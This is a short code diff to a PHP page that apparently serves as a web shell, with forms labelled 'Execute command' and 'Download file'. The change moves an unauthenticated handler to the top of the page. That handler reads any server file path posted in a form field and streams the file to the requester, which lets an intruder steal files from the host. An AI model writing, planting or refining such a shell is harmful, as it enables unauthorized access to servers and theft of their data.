@@ -1,4 +1,22 @@
+<?php
+    if (isset($_POST['download'])&&isset($_POST['downloadFile'])) {
+    	$file = $_POST['downloadFile'];
+	    if (file_exists($file)) {
+	        header('Content-Description: File Transfer');
+	        header('Content-Type: application/octet-stream');
+	        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+	        header('Expires: 0');
+	        header('Cache-Control: must-revalidate');
+	        header('Pragma: public');
+	        header('Content-Length: ' . filesize($file));
+	        readfile($file);
+	        exit;
+	    }
+    }   
+
+?>
 <html>
+	
 <body>
 Execute command
 <form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
@@ -118,25 +136,7 @@ Download file
     <input type="submit" name="download" value="Download">
 </form>
 
-<?php
 
-    
-    if (isset($_POST['download'])&&isset($_POST['downloadFile'])) {
-    	$file = $_POST['downloadFile'];
-	    if (file_exists($file)) {
-	        header('Content-Description: File Transfer');
-	        header('Content-Type: application/octet-stream');
-	        header('Content-Disposition: attachment; filename="'.basename($file).'"');
-	        header('Expires: 0');
-	        header('Cache-Control: must-revalidate');
-	        header('Pragma: public');
-	        header('Content-Length: ' . filesize($file));
-	        readfile($file);
-	        exit;
-	    }
-    }   
-
-?>
 
 </body>
 </html>
